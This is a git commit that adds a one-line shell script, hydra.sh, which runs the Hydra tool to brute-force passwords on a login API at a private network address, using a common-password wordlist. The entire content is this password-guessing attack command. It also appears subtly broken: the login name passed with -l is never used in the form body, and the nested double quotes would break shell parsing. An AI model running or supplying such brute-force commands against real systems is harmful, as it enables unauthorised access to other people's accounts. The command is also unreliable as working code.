23e931763a167b865aba0677333b681322058d1b
Jac <121095246+JacintaSyilloam@users.noreply.github.com>
2024-12-27 20:26:46 +0700

    hydra.sh

---
+++ hydra.sh
@@ -0,0 +1,1 @@
+hydra -l admin@mail.com -P ~/Desktop/10-million-password-list-top-1000.txt http-post-form "/api/v1/auth/login:{"user_email": "test@mail.com","user_password": "^PASS^"}:F=An Error Occurred" -V -s 80 http://192.168.1.78
